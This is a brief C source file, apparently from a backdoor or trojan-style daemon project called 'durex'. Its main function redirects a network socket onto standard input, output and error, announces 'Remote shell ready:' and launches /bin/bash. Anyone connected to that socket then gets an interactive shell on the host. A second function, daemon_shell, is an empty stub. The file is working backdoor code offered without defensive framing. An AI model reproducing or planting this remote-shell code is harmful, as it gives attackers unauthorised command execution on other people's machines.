#include "durex.h"

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/wait.h>

int		bash_prompt( int sck )
{
	close(0);
	close(1);
	close(2);
	if( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) {
		exit(1);
	}
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	printf("Remote shell ready:\n");
	execl( "/bin/bash", "/bin/bash", "-c", "bash", NULL );
	exit(1);
}

void	daemon_shell(int port)
{
	(void)port;
}
